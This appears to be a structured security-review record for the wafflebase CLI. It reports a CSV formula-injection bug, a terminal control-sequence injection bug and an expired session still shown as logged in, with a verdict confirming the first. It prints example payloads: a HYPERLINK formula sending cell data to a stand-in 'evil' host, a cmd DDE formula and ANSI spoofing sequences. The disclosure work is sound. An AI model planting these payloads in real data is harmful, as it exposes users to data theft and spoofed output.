samples.summary: CSV formula injection: `ctx list --format csv` newly routes server-supplied workspace names through `formatCsv`, which escapes quotes/commas/newlines but not spreadsheet formula prefixes
samples.evidence: `buildWorkspaceList` (packages/cli/src/commands/ctx.ts:27) emits `name` verbatim from the session's workspace list, which is populated from the server in login.ts:93-133 — i.e. from data another workspace member controls. Before this change `ctx list` ignored `--format` entirely and only ever printed prose; now `output(..., 'csv', ...)` is a supported path. `csvEscape` (csv.ts:15-24) only quotes on `,`, `"`, `\n`; it does not neutralize a leading `=`, `+`, `-`, `@`, tab or CR. Attack: an attacker who can name/rename a shared workspace sets it to `=HYPERLINK("http://evil/"&A1,"open")` (or `=cmd|'/c calc'!A1` on Windows/legacy Excel); the victim runs `wafflebase ctx list --format csv > ws.csv` and opens it in Excel/LibreOffice, executing the formula / exfiltrating adjacent cells. The helper is pre-existing and already reachable from other list commands (e.g. docs.ts:83 with server-supplied titles), so a fix belongs in `formatCsv` (prefix a `'` or escape leading `=+-@\t\r`), not in ctx.ts.

samples.summary: Terminal control-sequence injection: server-controlled strings are written to the TTY unescaped by the new `formatRecord` key/value renderer and by `formatTable`
samples.evidence: `formatRecord` interpolates `String(record[k] ?? '')` straight into a line printed via `console.log` (formatter.ts:61), and `formatTable` does the same at table.ts:43. Values reaching these paths include server-supplied workspace names (`buildWorkspaceList`, ctx.ts:27) and document titles from `docs list` (docs.ts:83). A name containing ANSI/OSC sequences (e.g. `\x1b[2K\r` to overwrite the line, or OSC 8 hyperlinks) lets an attacker who can name a shared workspace spoof or hide CLI output on the victim's terminal — including hiding which workspace is `active`. Impact is limited to display spoofing on modern terminals; `--format json` is unaffected because JSON.stringify escapes control chars. Pre-existing in `formatTable`/the old prose renderer; the new `formatRecord` extends the same behaviour to single-record payloads such as `status`.

samples.summary: `status` reports `loggedIn: true` for an expired session, while the docs instruct agents to branch solely on `loggedIn`
samples.evidence: `buildStatus` sets `loggedIn: true` (status.ts:46) whenever a session file exists, and records expiry only in the separate `session: 'valid' | 'expired'` field (status.ts:52). docs/design/cli.md (new §8.1 text) and the action's own comment (status.ts:66) both say "agents branch on `loggedIn`", so an agent following the documented contract treats a wholly expired credential set as authenticated and proceeds instead of re-authenticating. There is no server-side validation of the token either — the presence of ~/.wafflebase/session.json is the sole signal. No privilege escalation results (the backend still rejects the stale token, WorkspaceScopeGuard at packages/backend/src/api/v1/workspace-scope.guard.ts:35 enforces membership), so impact is a misleading auth-state report rather than a bypass. Consider `loggedIn: !isSessionExpired(session)` or documenting that `session` must be checked too.

verdict.reason: All claimed evidence verified in-repo. csv.ts:15-24 `csvEscape` quotes only on `,`, `"`, `\n` and does not neutralize leading `=`, `+`, `-`, `@`, tab, or CR, so a value beginning with a formula prefix is emitted verbatim into the cell. ctx.ts:73-83 confirms `ctx list` now parses `--format` and calls `output(buildWorkspaceList(...), fmt, ...)`, and formatter.ts:36-41/49-50 confirms `csv` is accepted and dispatched to `formatCsv` — so the CSV path is live. ctx.ts:27-31 passes `ws.name` through untouched. login.ts:92-103,135 shows `workspaces` is the unvalidated JSON body of `GET /workspaces`, i.e. server/other-member-controlled, so the name is untrusted input rather than local user input. docs.ts:83 reaches the same sink with server-supplied document fields, confirming the fix belongs in `formatCsv`. No sanitizer or allowlist exists anywhere between ingest and the CSV cell; `output()` (formatter.ts:59-62) only checks `quiet`. This is CWE-1236 formula injection — untrusted data reaching the spreadsheet formula interpreter — which falls in the injection / unsafe-input-handling lane, not the correctness lane. Attack chain is complete: attacker renames a shared workspace to `=HYPERLINK("http://evil/"&A1,"open")`, victim runs `ctx list --format csv > ws.csv` and opens it, leaking adjacent cells. Requiring the victim to open the file in a spreadsheet app is what keeps this at major rather than critical, matching the assigned severity. No not-present, already-guarded, or out-of-scope ground applies.
